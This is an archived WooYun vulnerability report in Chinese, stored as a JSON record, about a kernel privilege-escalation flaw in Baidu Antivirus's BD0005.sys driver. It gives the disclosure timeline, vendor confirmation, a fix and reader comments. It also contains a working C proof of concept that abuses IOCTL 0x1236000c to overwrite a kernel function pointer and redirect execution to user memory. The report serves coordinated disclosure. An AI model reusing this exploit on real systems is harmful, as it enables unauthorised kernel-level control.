{"id": 26569, "wybug_id": "wooyun-2015-0103397", "wybug_title": "百度杀毒某处内核提权漏洞", "wybug_corp": "百度", "wybug_author": "路人甲", "wybug_date": "2015-03-24 11:38", "wybug_open_date": "2015-06-22 16:54", "wybug_type": "权限提升", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["驱动权限提升"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-03-27：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-05-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-22：\t细节向公众公开  简要描述： BD0005.sys对输入参数校验不严格，被利用后可以在任意内核地址写入一个字节，将内核调用重定向到用户可控的地址，实现提权。 详细说明：  1.百度杀毒版本：\n\nBD0005.sys版本:2.0.0.6系统版本:windows xp sp3ntkrnlpa版本：5.1.2600.64192.系统启动过【安全沙箱】，BD0005.sys对IoControlCode=0x1236000c的处理逻辑不严谨，传入内核地址也会被写入1个字节0x42，只要精心布置内存布局，即可实现内核提权调用。根源如下：\n\n3.漏洞利用后的表现：\n\n\n\n   漏洞证明：  POC通过提前在用户地址布局利用代码，实现内核调用转向到可控地址。\nDWORD GetDriverBase(CHAR* pName){\ttypedef struct _SYSTEM_MODULE_INFORMATION {\t\tULONG Reserved [2]; \t\tPVOID Base; \t\tULONG Size; \t\tULONG Flags; \t\tUSHORT Index; \t\tUSHORT Unknown; \t\tUSHORT LoadCount; \t\tUSHORT ModuleNameOffset; \t\tCHAR ImageName [256 ]; \t} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION; \ttypedef LONG (WINAPI* FN_ZwQuerySystemInformation)(ULONG, PVOID, ULONG, PULONG);\tFN_ZwQuerySystemInformation fn = \t\t(FN_ZwQuerySystemInformation)GetProcAddress(GetModuleHandle(_T(\"ntdll\")), \"ZwQuerySystemInformation\");\tif(!fn)\t\treturn 0;\tDWORD dwBase = 0;\tCHAR* pBuffer = new CHAR[0x10000];\tmemset(pBuffer, 0, 0x10000);\tULONG cb = 0;\tLONG l = (*fn)(11, pBuffer, 0x10000, &cb);\tif(0 == l)\t{\t\tULONG count = *((ULONG*)pBuffer);\t\tPSYSTEM_MODULE_INFORMATION pInfo = (PSYSTEM_MODULE_INFORMATION)(pBuffer + sizeof(ULONG));\t\tfor (ULONG i = 0; i < count; ++i)\t\t{\t\t\tif('\\0' != pInfo[i].ImageName[0])\t\t\t{\t\t\t\tstrlwr(pInfo[i].ImageName);\t\t\t\t\t\t\tif(pName && strstr(pInfo[i].ImageName, pName))\t\t\t\t{\t\t\t\t\tdwBase = (DWORD)pInfo[i].Base;\t\t\t\t\tbreak;\t\t\t\t}\t\t\t}\t\t}\t}\tdelete pBuffer;\treturn dwBase;}void NtAllocVirtualPage(HANDLE hProcess, DWORD dwAddr){\ttypedef LONG (WINAPI*  NtAllocateVirtualMemory)(\t\tHANDLE ProcessHandle,\t\tPVOID *BaseAddress,\t\tULONG_PTR ZeroBits,\t\tPSIZE_T RegionSize,\t\tULONG AllocationType,\t\tULONG Protect);\tNtAllocateVirtualMemory fnAllocate = \t\t(NtAllocateVirtualMemory)GetProcAddress(GetModuleHandle(_T(\"ntdll\")), \"NtAllocateVirtualMemory\");\tif(fnAllocate)\t{\t\tPBYTE pBase = (PBYTE)dwAddr;\t\tSIZE_T len = 0x1000;\t\tLONG lSucceed = fnAllocate(hProcess, (PVOID*)&pBase, 0, &len, 0x3000, PAGE_EXECUTE_READWRITE);\t}}void CallDriver(HANDLE hDev){\tDWORD dwReturned = 0;\tDWORD driverBase = GetDriverBase(\"bd0005.sys\");\tWCHAR* input = L\"BDSANDBOX\";\tNtAllocVirtualPage(GetCurrentProcess(), 0x425b2ea4);\tif(!IsBadWritePtr((LPVOID)0x425b2ea4, 8))\t{\t\tmemcpy((LPVOID)0x425b2ea4, \"\\xcc\\xcc\\xcc\", 3);\t}\t\tDeviceIoControl(hDev,\t\t0x1236000c,\t\t(LPVOID)input,\t\t0x12,\t\t\t\t// bd0005.sys偏移0x21fd0保存的是NtClose的地址(0x805b2ea4)，\t\t// 通过漏洞将其高字节改为0x42,重定向到我可控的0x425b2ea4地址\t\t(LPVOID)(driverBase + 0x21fd3),\t\t0,\t\t&dwReturned,\t\tNULL);\t}void FuzzDriver(){\tLPCTSTR DevName = _T(\"\\\\\\\\.\\\\Bd0005Ctl\");\tHANDLE hDev = CreateFile(DevName,\t\tGENERIC_READ|GENERIC_WRITE,\t\tFILE_SHARE_READ|FILE_SHARE_WRITE,\t\tNULL,\t\tOPEN_EXISTING,\t\tFILE_ATTRIBUTE_NORMAL,\t\tNULL);\tif(INVALID_HANDLE_VALUE != hDev)\t{\t\tCallDriver(hDev);\t\tCloseHandle(hDev);\t}}int _tmain(int argc, _TCHAR* argv[]){\t\tFuzzDriver();\t\treturn 0;}\n   修复方案：  对IoControl=0x1236000c的传入参数做合法校验，只有UserSpace才允许写入;或者直接不接受outputBuffer。   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-03-24 16:52 厂商回复： 感谢提交 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-03-24 11:39 |    \t\tNoxxx \t\t\t( 普通白帽子  |\t\t\t        Rank:509 漏洞数:41        )\t\t \n  卧槽    \n     2015-03-24 11:39 |    \t\t90Snake \t\t\t( 普通白帽子  |\t\t\t        Rank:109 漏洞数:42        | 最大的漏洞就是人)\t\t \n  卧槽    \n     2015-03-24 12:02 |    \t\tluwikes \t\t\t( 普通白帽子  |\t\t\t        Rank:512 漏洞数:77        | 潜心学习~~~)\t\t \n  卧槽    \n     2015-03-24 12:20 |    \t\tbey0nd \t\t\t( 普通白帽子  |\t\t\t        Rank:895 漏洞数:142        | 相忘于江湖，不如相濡以沫)\t\t \n  百度杀毒好厉害呢    \n     2015-03-24 13:30 |    \t\t0x 80 \t\t\t( 普通白帽子  |\t\t\t        Rank:1301 漏洞数:398        | 某安全公司招聘系统运维、渗透测试、安全运...)\t\t \n  沙发~~~    \n     2015-03-24 14:19 |    \t\t黑名单 \t\t\t( 实习白帽子  |\t\t\t        Rank:60 漏洞数:13        | 像个傻瓜似的，为什么。)\t\t \n  杀毒用百度 蓝屏好伙伴 死机好机油！！百度杀毒 值得你的信赖    \n     2015-03-24 19:58 |    \t\tllkoio \t\t\t( 路人 |\t\t\t        Rank:20 漏洞数:3        | 热爱网络安全！)\t\t \n  膜拜大牛！    \n     2015-03-24 20:42 |    \t\t_Thorns \t\t\t( 普通白帽子  |\t\t\t        Rank:882 漏洞数:157        | 收wb 1：5 无限量收 [平台担保]))\t\t \n  我操，关注- -    \n     2015-03-25 11:46 |    \t\t0x 80 \t\t\t( 普通白帽子  |\t\t\t        Rank:1301 漏洞数:398        | 某安全公司招聘系统运维、渗透测试、安全运...)\t\t \n  牛B    \n     2015-03-27 17:33 |    \t\t无心 \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:4        | 有时候低头不是认输，是要看清自己的路；仰...)\t\t \n  @0x 80 你认识浅蓝？    \n     2015-03-28 11:28 |    \t\t猪猪侠表哥 \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:5        | 听说我表弟在这里混得不错。)\t\t \n  牛逼。。。    \n     2015-03-28 23:51 |    \t\tleakless \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:3        | 今天我没吃药感觉自己萌萌哒~~)\t\t \n  现在上网一不小心就中百度杀毒了..然后一不小心就被提权了..然后一不小心D盘的17.2G自拍就流传到1024了..然后一不小心就出名了..    \n     2015-06-22 16:56 |    \t\tyinian \t\t\t( 实习白帽子  |\t\t\t        Rank:67 漏洞数:22        | 代 码 审 计 求 交 流)\t\t \n  VC，写的再透彻点，我们好理解    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}